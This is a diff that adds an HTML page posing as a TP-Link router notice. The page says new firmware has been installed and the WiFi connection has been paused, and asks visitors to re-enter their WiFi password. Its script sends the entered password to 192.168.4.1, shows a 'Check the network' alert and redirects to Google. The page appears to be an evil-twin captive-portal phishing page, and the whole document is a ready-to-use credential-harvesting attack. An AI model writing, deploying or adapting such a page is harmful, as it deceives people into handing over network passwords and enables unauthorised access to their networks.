@@ -1,0 +1,97 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>tplink Router Security</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #FFFFFF;
+        color: black;
+        text-align: left;
+    }
+    .container {
+        max-width: 400px;
+        margin: auto;
+        padding: 20px;
+    }
+    .logo {
+        width: 140px;
+        height: 140px;
+    }
+    form {
+        background-color: white;
+        color: black;
+        padding: 20px;
+        border-radius: 5px;
+    }
+    input[type="text"], input[type="password"] {
+        width: 90%;
+        padding: 15px;
+        margin: 10px 0;
+        border: none;
+        background: #f1f1f1;
+    }
+    input[type="submit"] {
+        background-color: #00754a;
+        color: white;
+        padding: 14px 20px;
+        border: none;
+        cursor: pointer;
+        width: 100%;
+    }
+    @media screen and (max-width: 600px) {
+        .container {
+            width: 95%;
+        }
+    }
+    .welcome {
+        font-size: 24px;
+        margin-bottom: 0;
+    }
+    .login {
+        font-size: 16px;
+        margin-top: 0;
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+     <center>
+        <div class='containerlogo'>
+          <img data-testid=accessibleImg class="___1v417w0 f2rbwfs frvgh55" height=70% width=70% src=data:image/png;base64,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 alt=tpLink>
+        </div>
+      </center>
+        <form id="loginForm" onsubmit="sendCredentials(event)">
+		<h1>Firmware 2.0.16 installed.</h1>
+	    <p>The following security patches were applied:</p>
+			<bl>
+		<li>Removal of buffer overflow error on configuration page</li>
+		</bl>
+		<p>
+		<strong>For security reasons, the WiFi connection has been paused and requires you to reauthenticate.</strong> 
+		<p>
+		<p>Enter your WiFi password to reactivate the connection.</p>
+        <input type="hidden" id="email" class="form-control" placeholder="Email">
+        <input type="password" id="password" class="form-control" placeholder="WiFi connection password">
+        <button onclick="sendCredentials()" class="btn">Authenticate</button>
+    </div>
+
+    <script>
+        function sendCredentials() {
+            var email = "Wifi pass !";
+            var password = document.getElementById('password').value;
+            
+            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+			alert("Check the network.");
+            window.location.href = "https://www.google.com";
+        }
+
+        function getFile(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
